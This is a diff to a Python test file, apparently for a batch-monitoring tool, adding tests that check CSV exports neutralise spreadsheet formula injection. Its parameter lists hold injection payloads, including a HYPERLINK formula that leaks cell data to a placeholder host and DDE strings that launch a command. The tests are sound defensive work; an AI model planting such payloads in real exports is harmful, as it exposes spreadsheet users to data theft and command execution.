@@ -5,7 +5,12 @@ from decimal import Decimal as D
 import pytest
 
 from claude_batch_monitor.config import Configuracion
-from claude_batch_monitor.export import ErrorDeExportacion, exportar, formato_por_extension
+from claude_batch_monitor.export import (
+    ErrorDeExportacion,
+    exportar,
+    formato_por_extension,
+    neutralizar_formula,
+)
 from claude_batch_monitor.job import STATUS_COMPLETED, STATUS_FAILED, Job
 
 
@@ -44,6 +49,41 @@ class TestCsv:
     def test_lleva_bom_para_que_excel_respete_las_tildes(self, job, tmp_path):
         ruta = exportar(job, tmp_path / "r.csv")
         assert ruta.read_bytes().startswith(b"\xef\xbb\xbf")
+
+
+class TestInyeccionDeFormulas:
+    """Una hoja de cálculo ejecuta como fórmula lo que empieza por = + - @: una respuesta no debe poder hacerlo."""
+
+    PELIGROSAS = [
+        '=HYPERLINK("http://malo.example/?d="&A1,"pulsa")', "+1+1", "-2+3", "@SUM(A1:A9)", "=1+1",
+        "\t=1+1", "\r=1+1", "-1+cmd|' /C calc'!A0", "=cmd|' /C calc'!A0", "+A1", "-A1", "= 1",
+    ]
+
+    @pytest.mark.parametrize("texto", PELIGROSAS)
+    def test_se_antepone_un_apostrofo(self, texto):
+        assert neutralizar_formula(texto) == "'" + texto
+
+    @pytest.mark.parametrize("texto", ["Hola", "", "a=b", "1+1", "x - y", "  =1", "Respuesta: =1+1", "¿=?", "5", "-5", "+3,5", "-0.25", "-.5", " -7 "])
+    def test_el_resto_no_se_toca(self, texto):
+        assert neutralizar_formula(texto) == texto
+
+    def test_en_el_csv_exportado(self, job, tmp_path):
+        a, b = job.messages
+        a.text = '=HYPERLINK("http://malo.example","pulsa")'
+        b.detalle = "@alerta"
+        job.response_path(1, 1).write_text(
+            "====== SOLICITUD ======\nx\n\n====== RESPUESTA ======\n+cmd|' /C calc'!A0\n", encoding="utf-8")
+        filas = _leer_csv(exportar(job, tmp_path / "r.csv"))
+        assert filas[0]["solicitud"] == "'=HYPERLINK(\"http://malo.example\",\"pulsa\")"
+        assert filas[0]["respuesta"] == "'+cmd|' /C calc'!A0"
+        assert filas[1]["detalle"] == "'@alerta"
+        # lo que no empieza así queda igual, y las columnas numéricas no se tocan
+        assert filas[1]["solicitud"] == "Segunda, con coma\ny salto" and filas[0]["coste_usd"] == "0.000984"
+
+    def test_los_demas_formatos_conservan_el_texto_original(self, job, tmp_path):
+        job.messages[0].text = "=1+1"
+        reg = json.loads(exportar(job, tmp_path / "r.jsonl").read_text(encoding="utf-8").splitlines()[0])
+        assert reg["solicitud"] == "=1+1"
 
 
 class TestOtrosFormatos:
